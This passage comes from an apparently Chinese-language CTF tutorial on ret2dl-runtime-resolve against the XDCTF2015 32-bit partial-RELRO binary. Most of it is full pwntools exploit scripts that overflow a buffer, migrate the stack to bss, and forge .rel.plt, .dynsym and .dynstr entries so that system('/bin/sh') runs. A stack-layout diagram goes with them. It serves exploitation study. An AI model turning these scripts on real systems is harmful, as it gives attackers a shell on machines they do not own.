XDCTF2015~!\n"</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>binsh <span class="token operator">=</span> <span class="token string">"/bin/sh;"</span><span class="token comment">#获取plt0地址</span>plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr<span class="token comment">#获取.rel.plt基地址</span>rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".rel.plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr<span class="token comment">#获取.dynsym基地址</span>dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".dynsym"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addrfake_sym_addr <span class="token operator">=</span> read_bss_start <span class="token operator">+</span> <span class="token number">0x20</span><span class="token comment">#地址对齐</span>align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span>fake_sym_addr <span class="token operator">+=</span> alignfake_write_sym <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#计算.dynsym结构体下标</span>index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x10</span><span class="token comment">#计算write函数重定位索引</span>index_offset <span class="token operator">=</span> read_bss_start <span class="token operator">+</span> <span class="token number">0x18</span> <span class="token operator">-</span> rel_pltr_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7</span>fake_write_reloc <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>r_offset<span class="token punctuation">,</span> r_info<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">#输出/bin/sh;字符串，我们把该字符串写在read_bss_start+80处</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'dead'</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>read_bss_start<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_reloc<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span>align<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_sym<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/19/ret2-dl-runtime-resolve/16.png"></p><p>至于问题的出现请参考wiki：</p><p>这里我是尝试了几个地址：发现给read_bss_start再加上0x200即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>    <span class="token comment">#libc = elf.libc</span>    bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>    read_bss_start <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">0x800</span> <span class="token operator">+</span> i    <span class="token comment">#+  (0x080487C2-0x080487A8) // 2 * 0x10</span>    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>    <span class="token comment">#填充buf</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">)</span>    <span class="token comment">#向read_bss_start读入100个字节</span>    <span class="token comment">#rop.read会自动完成read函数、函数参数、返回地址的栈部署</span>    rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read_bss_start<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>    <span class="token comment">#栈迁移</span>    <span class="token comment">#rop.migrate会利用leave_ret自动部署栈迁移</span>    rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>read_bss_start<span class="token punctuation">)</span>    <span class="token comment">#print("rop.chain2:", rop.chain())</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Welcome to XDCTF2015~!\n"</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>    binsh <span class="token operator">=</span> <span class="token string">"/bin/sh;"</span>    <span class="token comment">#获取plt0地址</span>    plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr    <span class="token comment">#获取.rel.plt基地址</span>    rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".rel.plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr    <span class="token comment">#获取.dynsym基地址</span>    dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".dynsym"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr    fake_sym_addr <span class="token operator">=</span> read_bss_start <span class="token operator">+</span> <span class="token number">0x20</span>    <span class="token comment">#地址对齐</span>    align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span><span class="token punctuation">)</span>    fake_sym_addr <span class="token operator">+=</span> align    fake_write_sym <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x4c</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#计算.dynsym结构体下标</span>    index_dynsym <span class="token operator">=</span> <span class="token punctuation">(</span>fake_sym_addr <span class="token operator">-</span> dynsym<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">0x10</span>    <span class="token comment">#计算write函数重定位索引</span>    index_offset <span class="token operator">=</span> read_bss_start <span class="token operator">+</span> <span class="token number">0x18</span> <span class="token operator">-</span> rel_plt    r_offset <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>    r_info <span class="token operator">=</span> <span class="token punctuation">(</span>index_dynsym <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token number">0x7</span>    fake_write_reloc <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>r_offset<span class="token punctuation">,</span> r_info<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment">#输出/bin/sh;字符串，我们把该字符串写在read_bss_start+80处</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>plt0<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>index_offset<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'dead'</span><span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>read_bss_start<span class="token operator">+</span><span class="token number">80</span><span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_reloc<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span>align<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>fake_write_sym<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment">#print(rop.dump())</span>    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    exp<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/19/ret2-dl-runtime-resolve/17.png"></p><h3 id="stage5-–-迁移-dynstr"><a href="#stage5-–-迁移-dynstr" class="headerlink" title="stage5 – 迁移.dynstr"></a>stage5 – 迁移<code>.dynstr</code></h3><p>上一部分我们完成了<code>.dynsym</code>的迁移工作，这次在上一步的基础上继续将<code>.dynstr</code>迁移到bss段的新栈中，就是模拟下面红圈的部分：</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/18.png"></p><p>其实迁移<code>.dynstr</code>可以分为两步：</p><ul><li>部署write函数的字符串“write\x00”</li><li>更改write函数在<code>.dynsym</code>的第一位结构体成员变量st_name的值</li></ul><p><strong>部署write函数的字符串“write\x00”</strong></p><ul><li>在上一部分我们将<code>.dynsym</code>放置在了read_bss_start + 0x20的位置，但是由于对齐的原因，实际上需要4个字节进行填充，也就是我们实际上写<code>.dynsym</code>的结构体的起始位置应该是<code>fake_sym_addr = read_bss_start + 0x24</code>，由于<code>.dynsym</code>的结构体占16个字节，所以我们从<code>fake_sym_addr + 0x10</code>的位置开始部署write函数的字符串“write\x00”</li></ul><p>write后面加\x00是由于在<code>.dynstr</code>中每一段字符串都以\x00结尾；</p><p><strong>更改st_name</strong><br><strong>在上一部分讲过<code>.dynsym</code>是Elf32_Sym结构体，这个结构体的第一个成员变量<code>st_name</code>代表着相对<code>.dynstr</code>起始的偏移，所以如果需要部署<code>.dynstr</code>的话，<code>st_name</code>就必须更改。</strong>更改的值取决于我们想要在新栈中摆放<code>.dynstr</code>的位置，在上一步中已经确定了摆放位置，那么还是用之前的公式先做一个等式（具体解释请参考STAGE3部分内容）：</p><p><code>st_name + .dynstr = fake_sym_addr + 0x10</code></p><p>我们需要的是<code>st_name</code>，所以将等式变形：</p><p><code>st_name = fake_sym_addr + 0x10 - .dynstr</code></p><p>这样一来我们在部署<code>.dynsym</code>的结构体的内容的时候就可以写成：</p><p><code>fake_write_sym = flat([st_name, 0, 0, 0x12]）</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">   低地址位    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token number">0x00</span>  <span class="token operator">|</span>        plt0         <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">--</span>ret<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x04</span>  <span class="token operator">|</span>    index_offset     <span class="token operator">|</span> 伪造的<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>plt的结构体偏移        <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x08</span>  <span class="token operator">|</span>        AAAA         <span class="token operator">|</span> write函数返回地址    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x0c</span>  <span class="token operator">|</span>          <span class="token number">1</span>          <span class="token operator">|</span> write函数<span class="token number">1</span>参    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x10</span>  <span class="token operator">|</span>     <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>地址     <span class="token operator">|</span> write函数<span class="token number">2</span>参，<span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>字符串所在地址    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>                    <span class="token number">0x14</span>  <span class="token operator">|</span>          <span class="token number">7</span>          <span class="token operator">|</span> write函数<span class="token number">3</span>参         <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>      <span class="token number">0x18</span>  <span class="token operator">|</span>      r_offset       <span class="token operator">|</span> 伪造的<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>plt的结构体成员r_offset         <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x1c</span>  <span class="token operator">|</span>       r_info        <span class="token operator">|</span> 伪造的<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>plt的结构体成员r_info         <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x20</span>  <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>  对齐    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x24</span>  <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>  对齐    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x28</span>  <span class="token operator">|</span>       st_name       <span class="token operator">|</span>  伪造的<span class="token punctuation">.</span>dynsym的结构体的成员变量st_name   <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x2c</span>  <span class="token operator">|</span>       st_value      <span class="token operator">|</span>  伪造的<span class="token punctuation">.</span>dynsym的结构体的成员变量st_value   <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x30</span>  <span class="token operator">|</span>       st_size       <span class="token operator">|</span>  伪造的<span class="token punctuation">.</span>dynsym的结构体的成员变量st_size   <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x34</span>  <span class="token operator">|</span>       st_info       <span class="token operator">|</span>  伪造的<span class="token punctuation">.</span>dynsym的结构体的成员变量st_info    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>     <span class="token number">0x34</span>  <span class="token operator">|</span>        writ         <span class="token operator">|</span>  伪造的<span class="token punctuation">.</span>dynstr：write\x00         <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>   <span class="token number">0x34</span>  <span class="token operator">|</span>       e\x00         <span class="token operator">|</span>     <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>    <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>  填充              <span class="token operator">|</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token operator">|</span>  填充              <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>  填充                <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>                   <span class="token number">0x50</span><span class="token operator">|</span>      <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>       <span class="token operator">|</span> <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>字符串    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>     <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>    <span class="token operator">|</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token operator">|</span>                  <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>           高地址位  <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="stage6-–-替换system函数"><a href="#stage6-–-替换system函数" class="headerlink" title="stage6 – 替换system函数"></a>stage6 – 替换system函数</h3><p>我们已经完成了对栈的迁移、对<code>.rel.plt</code>的迁移、对<code>.dynsym</code>的迁移、对<code>.dynstr</code>的迁移。我们一直都是 以write函数做实验，并且通过前面的各个部分验证，证明/bin/sh字符串可以作为一个函数的参数使用。那么这一部分我们就可以将write函数替换成system函数了，并把第一个参数替换为binsh的地址read_bss_start+80即可。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>    <span class="token comment">#libc = elf.libc</span>    bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>    read_bss_start <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">0x800</span> <span class="token operator">+</span> i    <span class="token comment">#+  (0x080487C2-0x080487A8) // 2 * 0x10</span>    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>    <span class="token comment">#填充buf</span>    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">)</span>    <span class="token comment">#向read_bss_start读入100个字节</span>    <span class="token comment">#rop.read会自动完成read函数、函数参数、返回地址的栈部署</span>    rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read_bss_start<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>    <span class="token comment">#栈迁移</span>    <span class="token comment">#rop.migrate会利用leave_ret自动部署栈迁移</span>    rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>read_bss_start<span class="token punctuation">)</span>    <span class="token comment">#print("rop.chain2:", rop.chain())</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Welcome to XDCTF2015~!\n"</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>    binsh <span class="token operator">=</span> <span class="token string">"/bin/sh;"</span>    <span class="token comment">#获取plt0地址</span>    plt0 <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr    <span class="token comment">#获取.rel.plt基地址</span>    rel_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".rel.plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr    <span class="token comment">#获取.dynsym基地址</span>    dynsym <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".dynsym"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr    <span class="token comment">#获取.dynstr基地址</span>    dynstr <span class="token operator">=</span> elf<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".dynstr"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr    fake_sym_addr <span class="token operator">=</span> read_bss_start <span class="token operator">+</span> <span class="token number">0x20</span>    <span class="token comment">#地址对齐</span>    align <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fake_sym_addr <span 